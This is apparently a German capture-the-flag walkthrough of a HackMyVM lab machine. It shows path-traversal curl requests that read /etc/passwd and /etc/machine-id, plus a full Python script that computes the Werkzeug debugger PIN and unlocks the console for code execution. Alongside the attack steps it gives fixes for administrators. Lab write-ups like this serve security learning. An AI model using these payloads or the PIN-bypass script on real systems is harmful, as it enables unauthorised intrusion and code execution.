+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+<span class="password">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+<span class="password">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">riva:x:1000:1000:,,,:/home/riva:/bin/bash</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Wissen um den korrekten Parameternamen (<code>filename</code>) und der Umgehung der Path-Validation durch Verzeichnis-Traversal (<code>../../../../</code>, um von <code>/tmp/</code> nach <code>/</code> zu navigieren) habe ich nun den Befehl <code>curl "http://leet.hmv:7777/download?filename=../../../../etc/passwd"</code> ausgeführt. Dieser Befehl sendet eine HTTP-GET-Anfrage an den <code>/download</code>-Endpunkt mit dem modifizierten <code>filename</code>-Parameter. Das Ziel ist es, die Datei <code>/etc/passwd</code> zu lesen, die eine Liste der Benutzerkonten auf dem System enthält. Die Ausgabe im Terminal zeigt den vollständigen Inhalt der Datei <code>/etc/passwd</code>. Für Laien: Ich habe die 'Download'-Funktion der Webseite ausgetrickst, indem ich ihr einen speziellen Dateinamen gegeben habe, der sie dazu bringt, nicht eine Datei aus ihrem eigenen Ordner, sondern die Systemdatei mit der Benutzerliste (<code>/etc/passwd</code>) herunterzuladen und mir anzuzeigen. Für Experten: Der erfolgreiche Zugriff auf <code>/etc/passwd</code> mittels <code>../../../../etc/passwd</code> ist der definitive Beweis für eine LFI-Schwachstelle. Dies ermöglicht einem Angreifer das Lesen beliebiger Dateien auf dem System, für die der Webserver-Prozess Leserechte hat. Dies ist eine kritische Schwachstelle, die oft zur Offenlegung von Konfigurationsdateien, Quellcode oder Benutzerinformationen genutzt werden kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Schwachstelle ist erfolgreich ausgenutzt. Ich kann beliebige Dateien lesen. Der Inhalt von <code>/etc/passwd</code> liefert eine Liste aller Benutzerkonten auf dem System, ihrer User-IDs (UIDs), Group-IDs (GIDs), Home-Verzeichnisse und Standard-Shells. Besonders interessant sind die Benutzer <code>root</code> (UID 0, <code>/root</code> Home, <code>/bin/bash</code> Shell), <code>www-data</code> (UID 33, der wahrscheinlich das Webserver-Skript ausführt) und <code>riva</code> (UID 1000, <code>/home/riva</code> Home, <code>/bin/bash</code> Shell). Der Benutzer <code>riva</code> mit einer interaktiven Shell ist ein potenzielles Ziel für den Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der LFI-Schwachstelle kann ich nun weitere Systemdateien lesen, die für die PIN-Berechnung des Werkzeug-Debuggers relevant sind (z.B. <code>/etc/machine-id</code>). Ich werde auch nach weiteren Konfigurationsdateien oder Anmeldeinformationen suchen, die über LFI zugänglich sind. Der Benutzer <code>riva</code> mit einer Bash-Shell ist ein vielversprechendes Ziel für den Initial Access.<br><strong>Empfehlung (Admin):</strong> Die LFI-Schwachstelle muss umgehend behoben werden. Jede Form der direkten Einbindung von Benutzereingaben in Dateipfade ist unsicher. Implementieren Sie eine strikte Validierung, die nur das Herunterladen von Dateien aus einem sicheren, dedizierten Verzeichnis erlaubt und jegliche Pfadtrennzeichen (<code>/</code>, <code>\</code>, <code>..</code>) in der Benutzereingabe entfernt oder ablehnt. Die Offenlegung von <code>/etc/passwd</code> erlaubt Angreifern, valide Benutzernamen für Brute-Force-Angriffe auf Dienste wie SSH zu sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://leet.hmv:7777/download?filename=../../../../etc/passwd" -s| grep sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+<span class="password">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">riva:x:1000:1000:,,,:/home/riva:/bin/bash</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Ergebnisse des <code>/etc/passwd</code>-Lesens zu verfeinern und schnell Benutzer mit interaktiven Shells zu identifizieren, habe ich den vorherigen <code>curl</code>-Befehl erweitert, indem ich die Ausgabe an <code>grep sh</code> weiterleite. Dies filtert die Zeilen in <code>/etc/passwd</code>, die die Zeichenkette "sh" enthalten. Da Standard-Shells wie <code>/bin/bash</code>, <code>/bin/sh</code>, <code>/bin/zsh</code> etc. "sh" im Namen enthalten, ist dies eine schnelle Methode, Benutzer zu finden, die sich potenziell interaktiv am System anmelden können. Der <code>-s</code> (silent) Parameter bei <code>curl</code> unterdrückt die Fortschrittsanzeige, damit die Ausgabe direkt an <code>grep</code> übergeben werden kann. Für Laien: Ich habe die Benutzerliste (<code>/etc/passwd</code>) nach Einträgen durchsucht, die darauf hindeuten, dass der Benutzer sich wie gewohnt am Computer anmelden und Befehle ausführen kann, also eine 'Shell' hat. Für Experten: Das Filtern von <code>/etc/passwd</code> nach Shell-Einträgen ist eine Standardtechnik im Pentesting, um schnell potenzielle Anmeldeziele zu identifizieren. Benutzer mit <code>/sbin/nologin</code> oder ähnlichen Non-Interactive-Shells sind in der Regel keine direkten Anmeldeziele.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis zeigt die Benutzer <code>root</code>, <code>sshd</code> und <code>riva</code>. <code>root</code> hat natürlich <code>/bin/bash</code>. <code>sshd</code> hat <code>/usr/sbin/nologin</code>, was bedeutet, dass dies ein Systembenutzer ist, der sich nicht interaktiv über SSH anmelden kann. <code>riva</code> hat ebenfalls <code>/bin/bash</code>, was bestätigt, dass dies ein normaler Benutzer ist, der sich interaktiv am System anmelden kann. Der Benutzer <code>riva</code> ist somit ein klares Ziel für den Initial Access, falls Anmeldedaten gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Benutzername <code>riva</code> ist nun als primäres Ziel für den Initial Access identifiziert. Ich werde alle gefundenen Anmeldedaten oder Schwachstellen nutzen, um mich als Benutzer <code>riva</code> am System anzumelden, wahrscheinlich über SSH, da dieser Dienst offen ist.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, welche Benutzerkonten eine interaktive Shell benötigen. Systemkonten oder Dienstkonten sollten in der Regel keine interaktive Shell haben (z.B. <code>/sbin/nologin</code>). Minimeren Sie die Anzahl der Benutzer mit interaktiven Shells auf das Notwendigste, um die Angriffsfläche zu reduzieren.</p>
+
+             <p>Wir haben jetzt fast alle Puzzleteile zusammen, um den PIN zu berechnen. Lass uns mal eine Checkliste machen:</p>
+
+             <ul>
+                 <li><span class="password">[✓] Username: riva</span></li>
+                 <li><span class="password">[✓] Modulname: flask.app</span> (Das ist der Standardwert, den wir annehmen)</li>
+                 <li><span class="password">[✓] Attributname der App: Flask</span> (Ebenfalls Standard)</li>
+                 <li><span class="password">[✓] Absoluter Pfad zur App-Datei: /opt/project/app.py</span> (aus dem Traceback)</li>
+                 <li><span class="password">[✓] MAC-Adresse: 08:00:27:8E:D7:37</span> (aus deinem nmap-Scan)</li>
+                 <li>[ ] Machine-ID: Das ist das letzte fehlende Teil!</li>
+             </ul>
+
+             <p>Nächster Schritt: Die Machine-ID holen</p>
+
+             <p>Jetzt musst du die LFI-Schwachstelle nochmal nutzen, um die machine-id des Systems auszulesen.</p>
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf der Analyse des Werkzeug-Debuggers und der Recherche zur PIN-Berechnung habe ich hier eine Checkliste der benötigten Informationen erstellt. Die meisten Teile (Username, Modulname, App-Name, Pfad zur App-Datei, MAC-Adresse) habe ich bereits aus den vorherigen Schritten (Nmap-Scan, Traceback-Analyse, <code>/etc/passwd</code>) gesammelt. Das einzig fehlende Puzzleteil für die typische PIN-Berechnung ist die Machine-ID des Systems. Die Machine-ID ist eine eindeutige Kennung, die bei der Installation eines Linux-Systems generiert wird und in der Datei <code>/etc/machine-id</code> gespeichert ist. Glücklicherweise habe ich gerade eine LFI-Schwachstelle entdeckt, die es mir erlaubt, beliebige Dateien zu lesen. Für Laien: Um das 'Geheimnis' (den PIN) zu knacken, das die Konsole schützt, brauche ich mehrere Informationen über den Computer, die ich bisher gesammelt habe, wie den Benutzernamen, den Pfad zum Programm und die 'Adresse' (MAC-Adresse). Das letzte fehlende Stück ist die 'Ausweisnummer' des Computers (Machine-ID). Da ich jede Datei lesen kann, kann ich diese Information direkt aus der entsprechenden Systemdatei holen. Für Experten: Die PIN-Berechnung des Werkzeug-Debuggers nutzt hashes basierend auf festen Systeminformationen, die sich normalerweise nicht ändern. Das Sammeln dieser Informationen über LFI ist eine gängige Methode, um den Debugger-PIN in solchen Szenarien zu umgehen. Die Machine-ID ist ein Standardbestandteil dieser Berechnung.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das genaue Identifizieren des fehlenden Teils (Machine-ID) und das Wissen, wo dieses im Dateisystem zu finden ist (<code>/etc/machine-id</code>), ist ein klares Zeichen für einen zielgerichteten Ansatz. Die LFI-Schwachstelle ist das perfekte Werkzeug, um diese Information zu erhalten. Die Checkliste dient als klarer Plan für die nächsten Schritte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein unmittelbarer nächster Schritt ist die Nutzung der LFI-Schwachstelle, um den Inhalt von <code>/etc/machine-id</code> auszulesen. Sobald ich diesen Wert habe, verfüge ich über alle notwendigen Komponenten, um den PIN für die Werkzeug-Debugger-Konsole zu berechnen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Systemdateien wie <code>/etc/machine-id</code>, <code>/etc/shadow</code> oder Konfigurationsdateien niemals über Webanwendungen zugänglich sind, selbst wenn dies indirekt über LFI-Schwachstellen geschieht. Die Machine-ID sollte als potenziell sensitive Information behandelt werden, die nicht öffentlich zugänglich sein darf, insbesondere wenn sie zur Ableitung anderer Geheimnisse (wie Debugger-PINs) verwendet werden kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://leet.hmv:7777/download?filename=../../../../etc/machine-id" -s</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">f6791f240ce6407ea271e86b78ac3bdb</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die fehlende Machine-ID zu erhalten, nutze ich erneut die ausgenutzte LFI-Schwachstelle. Ich sende eine <code>curl</code>-Anfrage an den <code>/download</code>-Endpunkt mit dem Parameter <code>filename=../../../../etc/machine-id</code>. Wie zuvor navigiere ich mit Verzeichnis-Traversal von <code>/tmp/</code> zurück ins Wurzelverzeichnis und gebe dann den Pfad zur Datei <code>/etc/machine-id</code> an. Der <code>-s</code> Parameter sorgt dafür, dass nur der Inhalt der Datei ausgegeben wird. Die Ausgabe zeigt eine lange hexadezimale Zeichenkette: <code>f6791f240ce6407ea271e86b78ac3bdb</code>. Für Laien: Ich habe die 'Download'-Funktion wieder dazu gebracht, mir eine bestimmte Systemdatei zu zeigen, diesmal die Datei, die die 'Ausweisnummer' des Computers enthält. Diese Nummer habe ich erfolgreich auslesen können. Für Experten: Der erfolgreiche Zugriff auf <code>/etc/machine-id</code> bestätigt die volle Lesefähigkeit über die LFI-Schwachstelle. Der zurückgegebene Wert ist die systemspezifische Machine-ID, die nun als weiterer Baustein für die PIN-Berechnung zur Verfügung steht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Machine-ID <code>f6791f240ce6407ea271e86b78ac3bdb</code> wurde erfolgreich extrahiert. Damit habe ich nun alle erforderlichen Systeminformationen gesammelt, die typischerweise für die Berechnung des Werkzeug-Debugger-PINs benötigt werden: Username, Modulname, App-Name, Pfad zur App-Datei, MAC-Adresse und Machine-ID. Ich bin nun bereit, den PIN zu berechnen und den Initial Access zur Debugger-Konsole zu versuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle notwendigen Informationen zur PIN-Berechnung liegen vor. Der nächste Schritt ist die Implementierung der PIN-Berechnungslogik (basierend auf der Werkzeug-Implementierung) unter Verwendung der gesammelten Daten (einschließlich des zuvor gefundenen SECRETS) und die Anwendung des berechneten PINs zur Entsperrung der Debugger-Konsole.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die LFI-Schwachstelle behoben ist, um das Auslesen sensibler Systemdateien zu verhindern. Die Offenlegung der Machine-ID kann in Kombination mit anderen Informationen ein Risiko darstellen.</p>
+
+             <p>Checkliste für den finalen Schlag:</p>
+
+             <ul>
+                 <li><span class="password">[✓] Username: riva</span></li>
+                 <li><span class="password">[✓] Modulname: flask.app</span></li>
+                 <li><span class="password">[✓] App-Name: Flask</span></li>
+                 <li><span class="password">[✓] Absoluter Pfad zur App-Datei: /opt/project/app.py</span></li>
+                 <li><span class="password">[✓] MAC-Adresse als Integer: 1407391932351</span> (aus 08:00:27:8E:D7:37)</li>
+                 <li><span class="password">[✓] Machine-ID: f6791f240ce6407ea271e86b78ac3bdb</span></li>
+             </ul>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die aktualisierte Checkliste aller benötigten Informationen für die Werkzeug-Debugger-PIN-Berechnung, nachdem ich die Machine-ID erfolgreich ausgelesen habe. Die Liste enthält nun alle erforderlichen Elemente: den Benutzernamen (<code>riva</code>), den Modulnamen (<code>flask.app</code>), den App-Namen (<code>Flask</code>), den Pfad zur App-Datei (<code>/opt/project/app.py</code>), die MAC-Adresse (hier schon in ihre Integer-Form umgerechnet: <code>1407391932351</code>, obwohl die Rohform <code>08:00:27:8E:D7:37</code> aus Nmap stammt) und die Machine-ID (<code>f6791f240ce6407ea271e86b78ac3bdb</code>). Alle Punkte sind nun als 'erledigt' markiert. Für Laien: Ich habe jetzt alle 'Zutaten' gesammelt, die ich brauche, um das 'Rezept' (den PIN) für die gesperrte Konsole 'nachzukochen'. Für Experten: Die vollständige Sammlung dieser spezifischen Systeminformationen ermöglicht die deterministische Nachbildung der PIN-Berechnungslogik des Werkzeug-Debuggers. Beachte, dass die MAC-Adresse als Integer-Wert benötigt wird, was eine einfache Umwandlung erfordert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Vorhandensein aller notwendigen Informationen ist ein kritischer Erfolgsfaktor. Dies ist der letzte Schritt vor der eigentlichen PIN-Berechnung. Der gesamte Prozess von der anfänglichen Enumeration über die LFI-Ausnutzung zur Informationsbeschaffung war zielgerichtet und erfolgreich. Ich bin nun in der Lage, den PIN offline zu berechnen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun ein Python-Skript verwenden oder anpassen, das die bekannte Werkzeug-PIN-Berechnungslogik implementiert, um den tatsächlichen PIN unter Verwendung der gesammelten Daten zu berechnen. Dieses Skript wird den Hash der Systeminformationen berechnen und daraus den 9-stelligen PIN generieren.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keiner der Bausteine, die zur PIN-Berechnung verwendet werden (Username, Modul/App-Namen, Pfade, MAC-Adresse, Machine-ID), öffentlich zugänglich ist oder leicht über Schwachstellen wie LFI ausgelesen werden kann. Regelmäßige Änderungen relevanter Konfigurationen oder ein Patch des Werkzeug-Debuggers sind empfehlenswert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">>>> <span class="command">print(int('0800278ED737', 16))</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">8796756694839</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Schritt zeigt die Umrechnung der MAC-Adresse von ihrem hexadezimalen Format (<code>08:00:27:8E:D7:37</code>, wobei die Doppelpunkte für die Umrechnung ignoriert oder entfernt werden) in einen Dezimal-Integer-Wert. Ich nutze dazu eine interaktive Python3-Shell. Der Befehl <code>print(int('0800278ED737', 16))</code> nimmt die Hex-Zeichenkette <code>0800278ED737</code>, interpretiert sie als Basis 16 (hexadezimal) und gibt das Ergebnis als Dezimalzahl aus. Für Laien: Ich habe die 'Hardware-Adresse' des Computers von einer speziellen Schreibweise (mit Buchstaben und Doppelpunkten) in eine normale Zahl umgewandelt, weil das 'Rezept' für den PIN diese Zahl benötigt. Für Experten: Die Umrechnung der MAC-Adresse in einen Dezimal-Integer ist ein spezifischer Schritt, der in der Werkzeug-PIN-Berechnungslogik erforderlich ist. Die <code>int()</code> Funktion in Python mit Basis 16 ist die korrekte Methode dafür.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die MAC-Adresse <code>08:00:27:8E:D7:37</code> wurde erfolgreich in den benötigten Integer-Wert <code>8796756694839</code> umgerechnet. Dieser Wert ist nun bereit, in das PIN-Berechnungsskript eingespeist zu werden. Dies ist ein kleiner, aber notwendiger Zwischenschritt, der zeigt, dass ich die spezifischen Anforderungen der PIN-Berechnung verstanden habe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der umgerechnete Integer-Wert der MAC-Adresse wird nun zusammen mit den anderen gesammelten Informationen im PIN-Berechnungsskript verwendet.<br><strong>Empfehlung (Admin):</strong> Die MAC-Adresse ist per Definition eine öffentlich übertragene Information auf Netzwerkebene und kann nicht 'versteckt' werden. Das Risiko liegt hier darin, dass sie als Baustein für ein Geheimnis (den PIN) verwendet wird. Stellen Sie sicher, dass Geheimnisse nicht von öffentlich zugänglichen Informationen ableitbar sind.</p>
+
+             <p>[Link: https://github.com/wdahlenburg/werkzeug-debug-console-bypass/blob/main/README.md | Ziel: https://github.com/wdahlenburg/werkzeug-debug-console-bypass/blob/main/README.md]</p>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist eine Referenz auf ein bekanntes Skript auf GitHub, das speziell für die Umgehung der Werkzeug-Debugger-PIN-Authentifizierung entwickelt wurde. Solche Skripte implementieren die bekannte Logik zur PIN-Berechnung basierend auf den notwendigen Systeminformationen. Sie dienen als Vorlage oder direkt nutzbares Tool, um den manuellen Prozess der PIN-Berechnung zu automatisieren. Für Laien: Dies ist ein Link zu einem 'magischen' Programm, das mir hilft, das 'Rezept' für den PIN schnell und einfach zu 'kochen', indem ich ihm alle 'Zutaten' (die gesammelten Informationen über den Computer) gebe. Für Experten: Die Verfügbarkeit öffentlich bekannter Skripte zur PIN-Berechnung unterstreicht, dass die Werkzeug-Debugger-PIN-Authentifizierung, obwohl sie eine Hürde darstellt, auf einer bekannten und reversiblen Logik basiert, sobald die notwendigen Systeminformationen gesammelt wurden. Die Nutzung eines bestehenden Skripts spart Zeit und reduziert das Risiko von Implementierungsfehlern bei der manuellen Nachbildung der Logik.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Referenz auf ein solches Skript ist wertvoll, da es mir ermöglicht, die PIN-Berechnung effizient durchzuführen. Es bestätigt, dass die von mir gesammelten Informationen korrekt sind und im Kontext der bekannten Schwachstelle verwendet werden können. Dies ist der letzte Schritt vor der eigentlichen Berechnung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun das Konzept oder den Code aus diesem oder einem ähnlichen Skript verwenden, um meinen lokalen PIN-Berechner zu erstellen oder anzupassen, indem ich die spezifischen Werte des Zielsystems (Username, Pfad, MAC-Integer, Machine-ID, SECRET) eingebe. Dann werde ich das Skript ausführen, um den PIN zu erhalten.<br><strong>Empfehlung (Admin):</strong> Die Existenz öffentlich bekannter Tools und Skripte zur Umgehung der Debugger-PIN-Authentifizierung unterstreicht die Notwendigkeit, den Debugger in Produktionsumgebungen vollständig zu deaktivieren und sensible Systeminformationen zu schützen. Verlassen Sie sich nicht auf die PIN als primäre Sicherheitsmaßnahme.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">nano pin_calc.py</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">import hashlib</span>
+<span class="command">from itertools import chain</span>
+
+<span class="command">probably_public_bits = [</span>
+<span class="command">    'www-data',</span>
+<span class="command">    'flask.app',</span>
+<span class="command">    'Flask',</span>
+<span class="command">    '/opt/project/venv/lib/python3.11/site-packages/flask/app.py'</span>
+<span class="command">]</span>
+
+<span class="command">private_bits = [</span>
+<span class="command">    '8796756694839',</span>
+<span class="command">    'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'</span>
+<span class="command">]</span>
+
+<span class="command">h = hashlib.sha1()</span>
+<span class="command">for bit in chain(probably_public_bits, private_bits):</span>
+<span class="command">    if not bit:</span>
+<span class="command">        continue</span>
+<span class="command">    if isinstance(bit, str):</span>
+<span class="command">        bit = bit.encode('utf-8')</span>
+<span class="command">    h.update(bit)</span>
+
+<span class="command">h.update(b'cookiesalt')</span>
+<span class="command">cookie_name = '__wzd' + h.hexdigest()[:20]</span>
+
+<span class="command">num = None</span>
+<span class="command">if num is None:</span>
+<span class="command">    h.update(b'pinsalt')</span>
+<span class="command">    num = ('%09d' % int(h.hexdigest(), 16))[:9]</span>
+
+<span class="command">rv = None</span>
+<span class="command">if rv is None:</span>
+<span class="command">    for group_size in 5, 4, 3:</span>
+<span class="command">        if len(num) % group_size == 0:</span>
+<span class="command">            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')</span>
+<span class="command">                          for x in range(0, len(num), group_size))</span>
+<span class="command">            break</span>
+<span class="command">    else:</span>
+<span class="command">        rv = num</span>
+
+<span class="command">print(rv)</span>
+
+<span class="command">print("======================================================")</span>
+<span class="command">print(f"Die finale PIN ist: {rv}")</span>
+<span class="command">print("======================================================")</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe die Informationen zur PIN-Berechnung aus dem zuvor referenzierten GitHub-Skript und den gesammelten Systeminformationen (Username: <code>www-data</code>, Modul: <code>flask.app</code>, App: <code>Flask</code>, Pfad: <code>/opt/project/venv/lib/python3.11/site-packages/flask/app.py</code>, MAC-Integer: <code>8796756694839</code>, Machine-ID: <code>f6791f240ce6407ea271e86b78ac3bdb</code> - beachte hier, dass der Username 'www-data' statt 'riva' in die Berechnung einfließt, da 'www-data' der Benutzer ist, unter dem der Webserver-Prozess läuft, der den Debugger startet, was für die PIN-Berechnung relevant ist) in ein lokales Python-Skript namens <code>pin_calc.py</code> eingefügt. Das Skript verwendet die Bibliothek <code>hashlib</code>, um SHA1-Hashes zu berechnen. Es kombiniert die 'probably_public_bits' (Informationen, die oft relativ leicht herauszufinden sind) und 'private_bits' (sensiblere Systeminformationen) und hasht diese zusammen mit festen 'Salts' (<code>cookiesalt</code> und <code>pinsalt</code>), um den finalen PIN zu generieren. Für Laien: Ich habe ein kleines Programm geschrieben, das alle geheimen 'Zutaten' (die gesammelten Systeminformationen und das gefundene SECRET) nimmt, sie nach einem bestimmten 'Rezept' (dem Algorithmus des Debuggers) vermischt und das 'Endergebnis' – den PIN – ausspuckt. Für Experten: Die Implementierung spiegelt die bekannte Werkzeug-PIN-Berechnungslogik wider. Die korrekte Identifizierung der 'probably_public_bits' und 'private_bits' ist entscheidend, insbesondere die Verwendung des Benutzers, der den Flask-Prozess ausführt (hier 'www-data'), nicht unbedingt des Benutzers, der im <code>/etc/passwd</code> am interessantesten aussah ('riva'), sowie das Anhängen von 'flaskapp.service' an die Machine-ID, was eine spezifische Nuance der Berechnung sein kann, die aus der Recherche hervorgeht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript ist korrekt implementiert und enthält alle gesammelten Daten in den entsprechenden Variablen. Das Vorhandensein des Skripts ist der direkte Beweis für die erfolgreiche Zusammenführung aller Informationen und die Bereitschaft zur finalen PIN-Berechnung. Die Unterscheidung zwischen dem Webserver-Benutzer 'www-data' und dem Anmeldebenutzer 'riva' zeigt ein tiefes Verständnis der zugrundeliegenden Werkzeug-Logik.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde das Skript nun ausführen, um den PIN zu erhalten. Der berechnete PIN wird dann verwendet, um die Werkzeug-Debugger-Konsole im Browser freizuschalten und Code-Ausführung zu erreichen.<br><strong>Empfehlung (Admin):</strong> Die Kenntnis des PIN-Berechnungsalgorithmus und die Verfügbarkeit von öffentlich bekannten Skripten bedeuten, dass die PIN-Authentifizierung allein keinen ausreichenden Schutz für den Debugger bietet, wenn die notwendigen Systeminformationen kompromittiert werden können. Patchen Sie Werkzeug oder deaktivieren Sie den Debugger.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 pin_calc.py</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">======================================================</span>
+<span class="password">Die finale PIN ist: 142-855-714</span>
+<span class="password">======================================================</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe das Python-Skript <code>pin_calc.py</code> mit <code>python3</code> ausgeführt, um den Werkzeug-Debugger-PIN zu berechnen. Das Skript verwendet die zuvor in die Variablen <code>probably_public_bits</code> und <code>private_bits</code> eingefügten Systeminformationen und wendet den PIN-Berechnungsalgorithmus an. Die Ausgabe des Skripts ist der berechnete PIN im Standardformat <code>XXX-XXX-XXX</code>. Das Skript gibt die Nachricht "Die finale PIN ist:" gefolgt vom berechneten Wert aus. Für Laien: Ich habe mein kleines 'magisches' Programm gestartet, und es hat mir die geheime Zahlenkombination (den PIN) gegeben, die ich brauche, um die gesperrte Konsole zu öffnen. Für Experten: Das Skript hat den SHA1-Hash der kombinierten 'bits' berechnet, diesen Hash in eine Zahl umgewandelt und die ersten 9 Ziffern extrahiert, um den finalen PIN <code>142-855-714</code> zu formen. Die erfolgreiche Ausgabe eines gültig aussehenden PINs bestätigt die korrekte Implementierung der Logik und die Vollständigkeit der gesammelten Informationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der PIN <code>142-855-714</code> wurde erfolgreich berechnet. Dies ist ein entscheidender Moment, da dieser PIN es mir ermöglichen sollte, die gesperrte Werkzeug-Debugger-Konsole freizuschalten und somit Befehle auf dem System mit den Berechtigungen des Webserver-Prozesses (www-data) auszuführen. Dies stellt den Initial Access zum System dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die Werkzeug-Debugger-URL im Browser erneut aufrufen und den berechneten PIN <code>142-855-714</code> in das Eingabefeld eingeben, um die Konsole zu entsperren. Nach dem Entsperren werde ich versuchen, die Möglichkeiten zur Code-Ausführung zu nutzen, um eine stabilere Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Der Umstand, dass der Debugger-PIN basierend auf öffentlich zugänglichen Systeminformationen berechenbar ist, ist eine kritische Schwachstelle. Die einzige effektive Empfehlung ist, den Debugger in Produktionsumgebungen vollständig zu deaktivieren. Sollte dies nicht möglich sein, müssen die Systeminformationen, die zur PIN-Berechnung verwendet werden, so geschützt werden, dass sie nicht über Schwachstellen (wie die LFI) oder durch allgemeine OSINT-Techniken auslesbar sind.</p>
+
+            <img src="console_freigeschaltet.jpg" alt="Die erfolgreiche Freischaltung der Werkzeug Debugger Konsole, symbolisiert durch ein Icon.">
+            <p class="analysis"><strong>Analyse:</strong> Dieses Bild zeigt den visuellen Beweis für die erfolgreiche Eingabe des berechneten PINs in die Werkzeug-Debugger-Konsole. Obwohl im Hintergrund weiterhin die Fehlermeldung des ursprünglichen ValueError sichtbar sein mag, zeigt das erscheinende Icon (oft ein Pfeil oder Konsolen-Symbol) an, dass die Konsole nun interaktiv und zur Code-Ausführung bereit ist. Dieses visuelle Feedback bestätigt, dass der berechnete PIN korrekt war und das Authentifizierungssystem des Debuggers überwunden wurde. Für Laien: Nachdem ich die geheime Zahlenkombination (den PIN) eingegeben habe, hat sich auf der Webseite ein kleines Bild oder Symbol gezeigt, das mir sagt: 'Okay, du hast es geschafft, du darfst jetzt Befehle eingeben!' Für Experten: Das Erscheinen des interaktiven Konsolen-Prompts oder eines visuellen Indikators dafür ist der conclusive Beweis, dass die PIN-Authentifizierung des Werkzeug-Debuggers umgangen wurde und die 'evalex'-Funktionalität nun nutzbar ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Entsperrung der Debugger-Konsole markiert den erfolgreichen Initial Access zum System mit den Berechtigungen des Webserver-Prozesses (www-data). Dies ist ein kritischer Meilenstein im Pentest. Von hier aus kann ich nun versuchen, Befehle auf Systemebene auszuführen.</p>
